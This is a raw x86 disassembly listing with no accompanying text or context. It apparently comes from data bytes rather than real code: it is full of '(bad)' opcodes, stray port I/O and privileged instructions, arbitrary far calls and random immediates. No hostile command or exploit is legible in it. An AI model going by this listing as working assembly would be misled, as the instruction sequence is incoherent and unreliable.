  41fd4e:	jb     0x41fd0a
  41fd50:	cs xchg ebx,eax
  41fd52:	es (bad) 
  41fd54:	xor    BYTE PTR [edx+0x62],al
  41fd57:	jo     0x41fd95
  41fd59:	jle    0x41fd78
  41fd5b:	aam    0x11
  41fd5d:	bound  ebp,QWORD PTR ds:0x31777d30
  41fd63:	lods   al,BYTE PTR ds:[esi]
  41fd64:	push   es
  41fd65:	and    al,0xb2
  41fd67:	icebp  
  41fd68:	xchg   edi,ebp
  41fd6a:	adc    edi,DWORD PTR [ebx-0x1a]
  41fd6d:	loopne 0x41fdd5
  41fd6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd70:	fimul  DWORD PTR [edi]
  41fd72:	mov    ebx,0xccca0520
  41fd77:	bound  ebp,QWORD PTR [ebp+0x19]
  41fd7a:	sahf   
  41fd7b:	mov    edx,DWORD PTR [ebx+0x21176545]
  41fd81:	loope  0x41fdbf
  41fd83:	sbb    dl,cl
  41fd85:	inc    esi
  41fd86:	nop
  41fd87:	pop    ecx
  41fd88:	scas   al,BYTE PTR es:[edi]
  41fd89:	daa    
  41fd8a:	push   edi
  41fd8b:	or     bh,dh
  41fd8d:	outs   dx,BYTE PTR ds:[esi]
  41fd8e:	mov    eax,ds:0x85dcad7c
  41fd93:	outs   dx,DWORD PTR ds:[esi]
  41fd94:	push   ds
  41fd95:	in     al,0xc5
  41fd97:	mov    ebp,0x4a4649b6
  41fd9c:	jne    0x41fd61
  41fd9e:	push   ebx
  41fd9f:	ins    DWORD PTR es:[di],dx
  41fda1:	sub    al,0xa6
  41fda3:	inc    edx
  41fda4:	daa    
  41fda5:	sbb    al,ch
  41fda7:	mov    eax,0x9a1e5d35
  41fdac:	xchg   BYTE PTR [ecx-0x38],ch
  41fdaf:	xor    al,BYTE PTR [edi-0x5e182ebf]
  41fdb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdb6:	add    cx,WORD PTR [edx+0x29]
  41fdba:	xor    DWORD PTR [ebx],eax
  41fdbc:	or     DWORD PTR [ecx],edx
  41fdbe:	mov    ebp,edi
  41fdc0:	into   
  41fdc1:	retf   
  41fdc2:	shr    BYTE PTR [ecx+0x18d16eeb],cl
  41fdc8:	(bad)  
  41fdc9:	call   0x93a0:0xc31cd46
  41fdd0:	xchg   dl,cl
  41fdd2:	shl    DWORD PTR [ebp-0x47],1
  41fdd5:	jecxz  0x41fd88
  41fdd7:	dec    eax
  41fdd8:	dec    esi
  41fdd9:	(bad)  [ebp+0x7740e396]
  41fddf:	je     0x41fdea
  41fde1:	fcom   QWORD PTR [ebx-0x5a54bc10]
  41fde7:	and    al,0xd2
  41fde9:	xor    al,0x97
  41fdeb:	or     eax,0xc20bade9
  41fdf0:	ss (bad) 
  41fdf2:	daa    
  41fdf3:	adc    BYTE PTR [eax-0x1b],cl
  41fdf6:	inc    ebp
  41fdf7:	xor    ebp,0xbbb90599
  41fdfd:	lock mov DWORD PTR [ebp-0x7903fee7],esi
  41fe04:	and    al,0x3b
  41fe06:	mov    fs,WORD PTR [ebp+0x43]
  41fe09:	dec    edi
  41fe0a:	imul   ebx,DWORD PTR [edi+0x40],0x17b8e2ef
  41fe11:	pop    DWORD PTR [ebp-0x743253ed]
  41fe17:	int3   
  41fe18:	cmp    esp,DWORD PTR [ecx]
  41fe1a:	call   0x29b8:0xfd73b6d4
  41fe21:	out    dx,al
  41fe22:	out    dx,al
  41fe23:	aam    0xfe
  41fe25:	dec    edi
  41fe26:	adc    BYTE PTR [esi-0x35],0x33
  41fe2a:	fmul   DWORD PTR [eax+esi*8+0x3e]
  41fe2e:	daa    
  41fe2f:	mov    al,0x97
  41fe31:	mov    ds:0x168fcbf0,al
  41fe36:	daa    
  41fe37:	xchg   esi,eax
  41fe38:	(bad)  
  41fe3a:	pop    esp
  41fe3b:	add    ebx,DWORD PTR [ecx]
  41fe3d:	js     0x41fdf0
  41fe3f:	mov    cl,0x74
  41fe41:	stos   BYTE PTR es:[edi],al
  41fe42:	and    eax,0x4ec99b73
  41fe47:	push   esp
  41fe48:	pop    esp
  41fe49:	arpl   WORD PTR [eax-0xe],ax
  41fe4c:	fdivr  st(5),st
  41fe4e:	xor    DWORD PTR [eax],edi
  41fe50:	sbb    al,0xd1
  41fe52:	jg     0x41fe5a
  41fe54:	pusha  
  41fe55:	sbb    dl,BYTE PTR [esi+0x6950f203]
  41fe5b:	neg    BYTE PTR [esi-0x60]
  41fe5e:	ins    DWORD PTR es:[edi],dx
  41fe5f:	xchg   esp,eax
  41fe60:	jae    0x41fe4c
  41fe62:	sbb    eax,0x50c6abab
  41fe67:	and    BYTE PTR [ebx],cl
  41fe69:	test   al,0x9a
  41fe6b:	push   cs
  41fe6c:	xchg   esp,eax
  41fe6d:	bswap  esp
  41fe6f:	(bad)  [ecx+0xbf99745]
  41fe75:	pop    DWORD PTR [esi]
  41fe77:	int    0xb0
  41fe79:	ror    DWORD PTR [edi+0x3b22964d],cl
  41fe7f:	xchg   esi,eax
  41fe80:	jae    0x41fe23
  41fe82:	adc    DWORD PTR [ebx-0x2f],eax
  41fe85:	out    dx,al
  41fe86:	push   edx
  41fe87:	mov    edi,0x29c07ea2
  41fe8c:	or     edi,ecx
  41fe8e:	fbstp  TBYTE PTR [eax+0x0]
  41fe91:	sub    BYTE PTR gs:[ecx+0x2b],0xbe
  41fe96:	rol    DWORD PTR [ecx],cl
  41fe98:	or     edi,DWORD PTR [ebx-0x6f5f25d0]
  41fe9e:	adc    BYTE PTR [ecx+0x125fcf9],0xb0
  41fea5:	inc    esp
  41fea6:	retf   
  41fea7:	ds pop es
  41fea9:	mov    esi,0x5924fc85
  41feae:	add    DWORD PTR [ebx+0x7c30048c],ecx
  41feb4:	and    BYTE PTR [ebx],0x56
  41feb7:	mov    WORD PTR [ecx],es
  41feb9:	retf   0x8b6
  41febc:	lods   al,BYTE PTR ds:[esi]
  41febd:	lock mov ecx,0x54e65a6c
  41fec3:	inc    ebp
  41fec4:	ins    BYTE PTR es:[edi],dx
  41fec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fec6:	adc    BYTE PTR [ecx-0x49f4a2f4],bl
  41fecc:	cmp    DWORD PTR ds:0x443014af,0xfffffffe
  41fed3:	cmp    bl,dh
  41fed5:	out    dx,al
  41fed6:	pop    ebp
  41fed7:	mov    eax,ds:0x174ce84
  41fedc:	bound  ebp,QWORD PTR [esi]
  41fede:	sub    eax,DWORD PTR [edx-0x7c]
  41fee1:	xor    eax,0xc56bd7ab
  41fee6:	ja     0x41fee0
  41fee8:	adc    DWORD PTR [edx],edi
  41feea:	jl     0x41ff53
  41feec:	imul   BYTE PTR [eax]
  41feee:	in     eax,0x19
  41fef0:	outs   dx,DWORD PTR ds:[esi]
  41fef1:	xchg   ebx,eax
  41fef2:	into   
  41fef3:	mov    ds:0xec0af565,eax
  41fef8:	pop    ebp
  41fef9:	cwde   
  41fefa:	pop    esp
  41fefb:	(bad)  
  41fefd:	mov    DWORD PTR [ecx],edx
  41feff:	xor    edx,DWORD PTR [esi]
  41ff01:	into   
  41ff02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff03:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41ff05:	mov    ecx,0x5fc6e09b
  41ff0a:	(bad)  
  41ff0b:	or     DWORD PTR [edx+0x56],ebp
  41ff0e:	dec    ebp
  41ff0f:	xor    al,0x4c
  41ff11:	fwait
  41ff12:	or     al,0x6a
  41ff14:	jmp    0x41ff14
  41ff16:	dec    ebx
  41ff17:	retf   
  41ff18:	jl     0x41ff94
  41ff1a:	jnp    0x41fea1
  41ff1c:	and    DWORD PTR [ebx+0x16bc50b1],ebp
  41ff22:	push   edx
  41ff23:	out    dx,eax
  41ff24:	mov    edi,0x91f1135f
  41ff29:	sbb    al,0xe8
  41ff2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff2c:	dec    edi
  41ff2d:	pop    ebp
  41ff2e:	lahf   
  41ff2f:	sbb    ch,BYTE PTR [edx+0x982f6c3]
  41ff35:	pushf  
  41ff36:	push   esi
  41ff37:	mov    edx,edx
  41ff39:	or     eax,0x263a8f74
  41ff3e:	clc    
  41ff3f:	in     eax,0xea
  41ff41:	repz hlt 
  41ff43:	xchg   ecx,eax
  41ff44:	iret   
  41ff45:	add    eax,DWORD PTR [esi-0x19]
  41ff48:	inc    ebx
  41ff49:	rol    DWORD PTR [eax+ecx*8-0x2a7ee52a],cl
  41ff50:	add    eax,0xa2ecaf9
  41ff55:	arpl   WORD PTR [ebx+0x1a],sp
  41ff58:	adc    esp,DWORD PTR gs:[edx-0xc990bc4]
  41ff5f:	and    DWORD PTR [ebx+eiz*2+0x2c],esp
  41ff63:	cmp    eax,0xb6f62a29
  41ff68:	cmc    
  41ff69:	das    
  41ff6a:	in     eax,dx
  41ff6b:	in     al,0x9d
  41ff6d:	adc    dl,BYTE PTR [edx+0x4f]
  41ff70:	and    DWORD PTR [ebx],ebp
  41ff72:	mov    ecx,0x62c0526
  41ff77:	loop   0x41ffed
  41ff79:	add    esi,DWORD PTR [ebp+0x4c93948b]
  41ff7f:	(bad)  
  41ff80:	jmp    0xbdb2:0x99c917cf
  41ff87:	pop    es
  41ff88:	sub    cl,BYTE PTR [edx-0x25]
  41ff8b:	add    edx,DWORD PTR [eax+edi*4-0x14b710e8]
  41ff92:	addr16 sub eax,0xe8207a3
  41ff98:	test   BYTE PTR [eax+0x14],ah
  41ff9b:	xchg   BYTE PTR [ebx-0x72e72cac],al
  41ffa1:	push   0x9ee61474
  41ffa6:	cwde   
  41ffa7:	pop    esp
  41ffa8:	mov    eax,0x427fd02
  41ffad:	xchg   edx,eax
  41ffae:	jg     0x41fff3
  41ffb0:	in     al,dx
  41ffb1:	add    bl,BYTE PTR [si-0x5f13]
  41ffb6:	dec    eax
  41ffb7:	loopne 0x41ffd4
  41ffb9:	sbb    edx,eax
  41ffbb:	das    
  41ffbc:	mov    al,0xac
  41ffbe:	das    
  41ffbf:	stos   DWORD PTR es:[edi],eax
  41ffc0:	xor    BYTE PTR [esi],ch
  41ffc2:	cmc    
  41ffc3:	inc    ecx
  41ffc4:	push   cs
  41ffc5:	repnz mov cl,0x9a
  41ffc8:	stc    
  41ffc9:	dec    eax
  41ffca:	mov    esp,0xcafff35e
  41ffcf:	lahf   
  41ffd0:	sub    DWORD PTR [edx-0x65],ebx
  41ffd3:	xchg   esp,eax
  41ffd4:	dec    esi
  41ffd5:	icebp  
  41ffd6:	xlat   BYTE PTR ds:[ebx]
  41ffd7:	sub    DWORD PTR gs:[edi+edi*8+0x69c39938],ebp
  41ffdf:	lods   eax,DWORD PTR ds:[esi]
  41ffe0:	pop    ds
  41ffe1:	repnz out dx,al
  41ffe3:	push   esp
  41ffe4:	mov    eax,0xb57c585e
  41ffe9:	mov    ebp,cs
  41ffeb:	add    dh,BYTE PTR [esi+0x4]
  41ffee:	clc    
  41ffef:	jae    0x42000c
  41fff1:	stos   BYTE PTR es:[edi],al
  41fff2:	fsubr  DWORD PTR [esi-0x20226760]
  41fff8:	int    0x84
  41fffa:	call   0xa3c48ba7
  41ffff:	ins    BYTE PTR es:[edi],dx
  420000:	arpl   WORD PTR [ebx],ax
  420002:	mov    al,0xe5
  420004:	leave  
  420005:	ret    0xcaa4
  420008:	scas   eax,DWORD PTR es:[edi]
  420009:	xor    ebp,0xd5c0ec40
  42000f:	fstp   DWORD PTR [esi+0x5cb4d8b8]
  420015:	xchg   edx,eax
  420016:	mov    ebx,0xd82e1607
  42001b:	stc    
  42001c:	mov    WORD PTR [eax+edi*8-0x679f74af],cs
  420023:	lods   al,BYTE PTR ds:[esi]
  420024:	jne    0x41ffe1
  420026:	pushf  
  420027:	jmp    0x420023
  420029:	add    esi,esp
  42002b:	add    al,0x1b
  42002d:	out    0x4d,al
  42002f:	dec    eax
  420030:	cli    
  420031:	fidivr DWORD PTR [ebx-0x7fe4ccee]
  420037:	sub    ah,ah
  420039:	adc    eax,DWORD PTR [ebx-0x3c]
  42003c:	xchg   edx,eax
  42003d:	pusha  
  42003e:	ins    DWORD PTR es:[edi],dx
  42003f:	sbb    bh,dl
  420041:	or     eax,0x21bfbaf9
  420046:	push   ds
  420047:	push   cs
  420048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420049:	push   ebx
  42004a:	iret   
  42004b:	(bad)  
  42004c:	repz clc 
  42004e:	into   
  42004f:	mov    esp,0x39787499
  420054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420055:	cmp    al,0xa1
  420057:	jns    0x41ffec
  420059:	neg    dh
  42005b:	xor    BYTE PTR [ebp+0x0],0x8
  42005f:	das    
  420060:	mov    ebx,0x33397e58
  420065:	push   ebx
  420066:	sar    BYTE PTR [ebp+0x68ab96a5],0x55
  42006d:	stc    
  42006e:	ret    0xa808
  420071:	or     bh,BYTE PTR [ebx-0x571494d0]
  420077:	retf   
  420078:	lods   eax,DWORD PTR ds:[esi]
  420079:	add    DWORD PTR [ecx+0xeeca29b],edi
  42007f:	int    0xbe
  420081:	test   BYTE PTR [eax+0x75847720],dh
  420087:	mov    esi,0x9e78499f
  42008c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42008d:	add    DWORD PTR [edi+0x10],esp
  420090:	inc    ecx
  420091:	xor    al,0x40
  420093:	out    0x90,al
  420095:	fist   WORD PTR [esi+0x3]
  420098:	int    0x2c
  42009a:	nop
  42009b:	inc    edi
  42009c:	loopne 0x4200c1
  42009e:	and    DWORD PTR [ebp-0x2a1286a0],ecx
  4200a4:	mov    ebp,0x47c819ce
  4200aa:	fsub   QWORD PTR [eax]
  4200ac:	mov    dh,cl
  4200ae:	inc    ecx
  4200af:	(bad)  
  4200b1:	pusha  
  4200b2:	push   ebx
  4200b3:	stos   BYTE PTR es:[edi],al
  4200b4:	imul   edx,DWORD PTR [eax+0x744362e3],0xb205f7f8
  4200be:	into   
  4200bf:	icebp  
  4200c0:	jmp    0x420089
  4200c2:	aas    
  4200c3:	mov    al,0x69
  4200c5:	imul   esp,DWORD PTR [edx+0x438d3cfa],0x2d3de1b4
  4200cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200d0:	ficomp DWORD PTR ss:[ecx]
  4200d3:	mov    edi,DWORD PTR [ecx]
  4200d5:	pop    ss
  4200d6:	or     al,0x43
  4200d8:	dec    ebx
  4200d9:	and    al,0xdb
  4200db:	fmul   st(1),st
  4200dd:	mov    esp,0x96103410
  4200e2:	into   
  4200e3:	lea    edi,[esi-0x10]
  4200e6:	cld    
  4200e7:	push   0xffffffdd
  4200e9:	and    DWORD PTR [ebp-0x6f],0xffffffca
  4200ed:	mov    BYTE PTR [edx],bl
  4200ef:	es jnp 0x4200eb
  4200f2:	retf   
  4200f3:	fwait
  4200f4:	sub    eax,0x41aecec4
  4200f9:	loop   0x4200a1
  4200fb:	add    bh,dh
  4200fd:	xchg   ecx,eax
  4200fe:	cmp    eax,DWORD PTR [esi]
  420100:	std    
  420101:	pop    ecx
  420102:	xchg   ecx,eax
  420103:	inc    edx
  420104:	and    esi,ebp
  420106:	cmp    DWORD PTR [edx],esi
  420108:	fcom   DWORD PTR [edi-0xaad74e9]
  42010e:	cmc    
  42010f:	pushf  
  420110:	rcl    DWORD PTR [edi-0x76],0x47
  420114:	mov    ah,0xf2
  420116:	push   esi
  420117:	or     eax,0x4d67b15b
  42011c:	mov    ah,bh
  42011e:	gs into 
  420120:	aaa    
  420121:	jae    0x420180
  420123:	sub    ebx,DWORD PTR [eax-0x53]
  420126:	sub    esp,ebp
  420128:	jge    0x42012c
  42012a:	jo     0x420107
  42012c:	mov    ds:0xe248bf77,al
  420131:	sahf   
  420132:	call   0x63aa:0x7364f4c5
  420139:	popa   
  42013a:	or     DWORD PTR [ebp-0x64],ebx
  42013d:	ins    DWORD PTR es:[edi],dx
  42013e:	push   0xea51b65d
  420143:	fnstenv [ecx-0x1c]
  420146:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  420148:	shl    BYTE PTR [edi+0x6964ac62],cl
  42014e:	cmp    ah,bh
  420150:	ret    0x9130
  420153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420154:	inc    edi
  420155:	(bad)  
  420156:	push   esi
  420157:	lock xchg ecx,eax
  420159:	and    edx,DWORD PTR [ecx]
  42015b:	ins    DWORD PTR es:[edi],dx
  42015c:	push   ebx
  42015d:	arpl   WORD PTR [ebx-0x2a0961f6],bx
  420163:	jmp    0x4201e3
  420165:	push   cs
  420166:	and    cl,BYTE PTR [edx+edi*4+0x58]
  42016a:	mov    eax,ds:0x4a6b1fcf
  42016f:	or     esp,DWORD PTR [edi-0x50]
  420172:	js     0x42013c
  420174:	cmp    BYTE PTR [edi+0x5d],bl
  420177:	and    DWORD PTR [ebx-0x6b],ebx
  42017a:	bound  ebx,QWORD PTR [edx+0x14]
  42017d:	inc    esi
  42017e:	bound  ebp,QWORD PTR [ecx]
  420180:	pop    ecx
  420181:	push   ss
  420182:	pop    esp
  420183:	sar    BYTE PTR [esi-0x7a],0xe2
  420187:	enter  0x3b11,0x4a
  42018b:	cmp    DWORD PTR ds:0x8405c635,esp
  420191:	and    ecx,DWORD PTR [edx-0x391b9751]
  420197:	mov    cl,0xf
  420199:	push   es
  42019a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42019b:	scas   al,BYTE PTR es:[edi]
  42019c:	mov    ds:0x177b079,eax
  4201a1:	aaa    
  4201a2:	mov    ecx,0xde1ea5a1
  4201a7:	cdq    
  4201a8:	daa    
  4201a9:	js     0x4201ae
  4201ab:	repz fild DWORD PTR [ebx+0x460c74b0]
  4201b2:	cmp    ecx,DWORD PTR ds:0x9dc749b5
  4201b8:	sbb    DWORD PTR [ecx-0x7a],ebx
  4201bb:	mov    ecx,0x97856af8
  4201c0:	mov    cl,0xdb
  4201c2:	test   al,0xb6
  4201c4:	not    DWORD PTR [edx-0x6decca6f]
  4201ca:	xor    DWORD PTR [edi],edx
  4201cc:	inc    ebp
  4201cd:	fcom   DWORD PTR [edi+0x7a9845d6]
  4201d3:	adc    eax,0xe6773eef
  4201d8:	ja     0x420190
  4201da:	fmul   st(6),st
  4201dc:	ret    0x1573
  4201df:	mov    cl,BYTE PTR [edx-0x54]
  4201e2:	sahf   
  4201e3:	dec    eax
  4201e4:	fisub  WORD PTR [edi]
  4201e6:	nop
  4201e7:	(bad)  
  4201e8:	repnz cmp ah,BYTE PTR [edi+0x34]
  4201ec:	sbb    eax,0x2784244d
  4201f1:	mov    dh,0x38
  4201f3:	mov    al,ds:0x46076a94
  4201f8:	jnp    0x42021e
  4201fa:	test   al,0x23
  4201fc:	ds das 
  4201fe:	mov    edi,0x5eacb598
  420203:	arpl   bp,si
  420205:	dec    edi
  420206:	add    dh,BYTE PTR [eax-0x2de49e91]
  42020c:	ja     0x420215
  42020e:	aam    0x1e
  420210:	push   0xffffff8e
  420212:	dec    edi
  420213:	jl     0x4201ce
  420215:	icebp  
  420216:	ins    DWORD PTR es:[edi],dx
  420217:	and    al,BYTE PTR [eax+0x145b7230]
  42021d:	inc    ecx
  42021e:	les    ecx,FWORD PTR [esp+ebp*2]
  420221:	fcomp  QWORD PTR [esi-0x57675de8]
  420227:	repz rcr BYTE PTR [eax],1
  42022a:	xchg   edi,eax
  42022b:	dec    ecx
  42022c:	cli    
  42022d:	push   0x4f8a0906
  420232:	pop    edi
  420233:	or     bl,cl
  420235:	xchg   edx,eax
  420236:	jns    0x420252
  420238:	cmp    al,0xd5
  42023a:	and    dl,BYTE PTR [eax]
  42023c:	retf   
  42023d:	fiadd  DWORD PTR [edx]
  42023f:	mov    edx,0xdf10f3e2
  420244:	xor    dh,BYTE PTR [esi+esi*4-0x37]
  420248:	outs   dx,DWORD PTR ds:[esi]
  420249:	not    DWORD PTR [edi*2-0x167806d3]
  420250:	jg     0x4202cf
  420252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420253:	jecxz  0x420273
  420255:	jg     0x42028a
  420257:	pop    ebp
  420258:	scas   eax,DWORD PTR es:[edi]
  420259:	out    0x30,al
  42025b:	fild   QWORD PTR [edx+0x71]
  42025e:	cmp    ah,ah
  420260:	sbb    dh,BYTE PTR [ecx+0x4f]
  420263:	in     al,dx
  420264:	loope  0x420277
  420266:	shld   eax,ebx,0xcd
  42026a:	fdivr  st(0),st
  42026c:	(bad)  
  42026d:	call   0xf54b4124
  420272:	mov    eax,ds:0xb72b11d1
  420277:	retf   
  420278:	sti    
  420279:	sbb    DWORD PTR [esi],ebx
  42027b:	rcr    BYTE PTR [ebp-0x322c731a],cl
  420281:	xor    dh,BYTE PTR [edx-0x5fbf37d3]
  420287:	mov    eax,ds:0xbb723037
  42028c:	push   esp
  42028d:	sub    bh,al
  42028f:	div    DWORD PTR [esi]
  420291:	fcom   st(1)
  420293:	cli    
  420294:	jp     0x4202a3
  420296:	dec    ecx
  420297:	in     al,dx
  420298:	out    0xb8,al
  42029a:	icebp  
  42029b:	sub    eax,0xa29250cb
  4202a0:	pop    ebx
  4202a1:	push   edi
  4202a2:	std    
  4202a3:	and    eax,0xe1f4aef4
  4202a8:	outs   dx,DWORD PTR ds:[esi]
  4202a9:	inc    bh
  4202ab:	jae    0x4202e6
  4202ad:	in     al,0x2d
  4202af:	data16 xor dl,bl
  4202b2:	mov    BYTE PTR [ebx+esi*8],bl
  4202b5:	push   0x66
  4202b7:	jbe    0x420320
  4202b9:	popa   
  4202ba:	fsubr  DWORD PTR [edx+esi*8]
  4202bd:	mov    eax,ds:0x75c9434
  4202c2:	dec    edi
  4202c3:	dec    ebp
  4202c4:	out    dx,eax
  4202c5:	inc    ebx
  4202c6:	mov    ebx,0x52c076a6
  4202cb:	cmp    ch,BYTE PTR [esi-0x17]
  4202ce:	cwde   
  4202cf:	ds dec ebx
  4202d1:	push   ecx
  4202d2:	aam    0x7e
  4202d4:	test   al,0xb
  4202d6:	pop    ss
  4202d7:	in     eax,0xa7
  4202d9:	xlat   BYTE PTR ds:[ebx]
  4202da:	int3   
  4202db:	or     eax,0xcc658f97
  4202e0:	adc    edi,0xec8b4a96
  4202e6:	hlt    
  4202e7:	lods   al,BYTE PTR ds:[esi]
  4202e8:	idiv   BYTE PTR ds:0x166a557a
  4202ee:	dec    edi
  4202ef:	push   ds
  4202f0:	iret   
  4202f1:	inc    edx
  4202f2:	xchg   DWORD PTR [ecx],ecx
  4202f4:	stc    
  4202f5:	or     eax,0x65f1be4b
  4202fa:	pop    edi
  4202fb:	cmp    al,0x78
  4202fd:	in     eax,0x7e
  4202ff:	cmp    dl,BYTE PTR [esi-0x10adb15]
  420305:	aad    0xd5
  420307:	sbb    BYTE PTR [eax+0x5d56c599],ch
  42030d:	(bad)  
  42030e:	mov    bl,0x60
  420310:	push   esp
  420311:	or     eax,0x35603749
  420316:	or     edx,0x6f256b77
  42031c:	add    dh,al
  42031e:	push   0x95318e47
  420323:	xlat   BYTE PTR ds:[ebx]
  420324:	mov    esi,DWORD PTR [edi-0x44d74c7b]
  42032a:	shl    BYTE PTR [edi],1
  42032c:	mov    dh,0xe1
  42032e:	enter  0xe558,0x2e
  420332:	(bad)
  420335:	pop    edi
  420336:	jg     0x42035b
  420338:	iret   
  420339:	inc    eax
  42033a:	in     eax,0xb7
  42033c:	pop    ebx
  42033d:	(bad)  
  42033e:	push   ss
  42033f:	jmp    0x420377
  420341:	add    al,0x5e
  420343:	ins    DWORD PTR es:[edi],dx
  420344:	xor    DWORD PTR [ebp+0x5f],ebx
  420347:	xor    DWORD PTR ds:0x9c1f4158,esp
  42034d:	shl    DWORD PTR [eax-0x31],1
  420350:	cmp    eax,0x8b1b199c
  420355:	mov    ch,0xf7
  420357:	mov    ds:0x54bbd9c0,eax
  42035c:	jl     0x4203b1
  42035e:	add    eax,0xffdabb43
  420363:	hlt    
  420364:	and    ebp,DWORD PTR [ebx+0xe]
  420367:	sub    eax,0xb04c4b42
  42036c:	cmp    esi,ebp
  42036e:	push   eax
  42036f:	push   0xffffffd3
  420371:	push   ebx
  420372:	and    dl,al
  420374:	jns    0x420347
  420376:	mov    dh,0xd7
  420378:	mov    ch,0xae
  42037a:	retf   
  42037b:	adc    dl,dh
  42037d:	inc    edx
  42037e:	xchg   edx,eax
  42037f:	and    dh,BYTE PTR [ebx-0x5f]
  420382:	cmp    esi,DWORD PTR [eax+0x3f8d0456]
  420388:	inc    edi
  420389:	stos   DWORD PTR es:[edi],eax
  42038a:	xor    ebp,DWORD PTR [edx+0x2f7fa6ce]
  420390:	inc    edx
  420391:	mov    ds:0xfb379d3,eax
  420396:	push   ecx
  420397:	cmp    eax,esp
  420399:	pop    edx
  42039a:	imul   esp,edx,0xca6d5aca
  4203a0:	out    dx,al
  4203a1:	xlat   BYTE PTR ds:[ebx]
  4203a2:	test   DWORD PTR [ebx+eax*8],0x378ad3da
  4203a9:	out    0x2e,eax
  4203ab:	pop    edx
  4203ac:	je     0x420376
  4203ae:	shl    BYTE PTR [eax+edx*8+0xd164ee],cl
  4203b5:	imul   ecx,DWORD PTR [esi+0x2b],0xab6e7888
  4203bc:	(bad)  
  4203bd:	in     eax,dx
  4203be:	jge    0x42036c
  4203c0:	shr    BYTE PTR [ebp-0x45431527],1
  4203c6:	ss inc esi
  4203c8:	int    0x9f
  4203ca:	or     ebp,DWORD PTR [edi+eiz*2+0xa8f5da0]
  4203d1:	out    0x9f,eax
  4203d3:	push   ss
  4203d4:	push   0xa45fffd9
  4203d9:	pushw  cs
  4203db:	mov    al,ds:0xbd6ad18b
  4203e0:	js     0x4203d4
  4203e2:	out    0xb1,al
  4203e4:	hlt    
  4203e5:	mov    esi,0xe234f40
  4203ea:	in     eax,0x74
  4203ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203ed:	xor    al,0xc9
  4203ef:	dec    eax
  4203f0:	sbb    edx,ecx
  4203f2:	add    al,0x25
  4203f4:	(bad)  
  4203f5:	jl     0x4203ee
  4203f7:	and    al,0x96
  4203f9:	fmul   st(6),st
  4203fb:	cmp    BYTE PTR [ebx-0x40],0x54
  4203ff:	aam    0x7e
  420401:	xchg   esi,eax
  420402:	imul   ebp,DWORD PTR [esi-0x23],0x7e
  420406:	popa   
  420407:	xchg   esi,eax
  420408:	scas   al,BYTE PTR es:[edi]
  420409:	sbb    al,0x9b
  42040b:	jo     0x4203ca
  42040d:	into   
  42040e:	push   ebx
  42040f:	fcmovb st,st(5)
  420411:	inc    ecx
  420412:	cdq    
  420413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420414:	xchg   edx,eax
  420415:	call   0x325a:0xe41954d5
  42041c:	push   ebx
  42041d:	or     BYTE PTR [ebx+0x1473d0a8],dl
  420423:	mov    edi,0x4828a393
  420428:	popa   
  420429:	add    bh,BYTE PTR [ecx+ebp*1-0x6c]
  42042d:	xor    eax,DWORD PTR [ebx+0x677e3658]
  420433:	int    0x1b
  420435:	pop    ss
  420436:	dec    edi
  420437:	call   0xd0b4:0xf106af6a
  42043e:	pop    esp
  42043f:	cdq    
  420440:	jmp    0xe33663a3
  420445:	adc    al,0xe4
  420447:	push   0x78
  420449:	stc    
  42044a:	int    0x35
  42044c:	jmp    0x68af:0xc9e0c2c
  420453:	mov    ds:0x3b73bbae,eax
  420458:	(bad)  
  420459:	(bad)  
  42045a:	clc    
  42045b:	sub    eax,0x6c82b0d9
  420460:	call   0x95d6:0xab99695b
  420467:	xchg   esi,eax
  420468:	xlat   BYTE PTR ds:[ebx]
  420469:	xchg   DWORD PTR [ecx],ebp
  42046b:	xchg   esi,eax
  42046c:	stc    
  42046d:	push   ebx
  42046e:	dec    ecx
  42046f:	or     edx,DWORD PTR [ecx-0x43]
  420472:	nop
  420473:	sbb    BYTE PTR [eax+0x67ee9c9a],ah
  420479:	ds mov al,0x84
  42047c:	mov    dh,0x16
  42047e:	push   esi
  42047f:	addr16 dec edx
  420481:	loopne 0x420454
  420483:	aam    0x81
  420485:	in     eax,0x1
  420487:	mov    esi,0x47d9a8b7
  42048c:	dec    ebp
  42048d:	dec    eax
  42048e:	mov    ecx,0x5b5e6553
  420493:	retf   0xed53
  420496:	inc    edx
  420497:	cmp    DWORD PTR [ebp-0x1],esi
  42049a:	jnp    0x420443
  42049c:	adc    al,0x88
  42049e:	jb     0x4204b2
  4204a0:	hlt    
  4204a1:	jno    0x4204ab
  4204a3:	push   0x795d0acf
  4204a8:	xchg   DWORD PTR [edi],edi
  4204aa:	(bad)  
  4204ab:	push   ebx
  4204ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204ad:	loope  0x42046e
  4204af:	lods   eax,DWORD PTR ds:[esi]
  4204b0:	cmp    al,0x83
  4204b2:	xchg   ebp,eax
  4204b3:	shl    BYTE PTR [eax-0xa],0x2a
  4204b7:	inc    eax
  4204b8:	in     al,dx
  4204b9:	sub    DWORD PTR [esi-0x38637c2d],0x56
  4204c0:	xor    BYTE PTR [edx],bl
  4204c2:	cwde   
  4204c3:	cs mov ecx,0x9824189b
  4204c9:	nop
  4204ca:	call   0x858b:0xf11cbd36
  4204d1:	out    dx,eax
  4204d2:	lea    esi,[esi+edi*2-0x1f]
  4204d6:	mov    dh,al
  4204d8:	dec    ebx
  4204d9:	xchg   BYTE PTR [eax+edi*2+0x65716809],al
  4204e0:	jl     0x4204ea
  4204e2:	fsub   QWORD PTR [edi-0x6]
  4204e5:	push   ebp
  4204e6:	xor    dh,BYTE PTR [edx-0x3857f620]
  4204ec:	enter  0x4002,0x6b
  4204f0:	(bad)  
  4204f2:	push   ebx
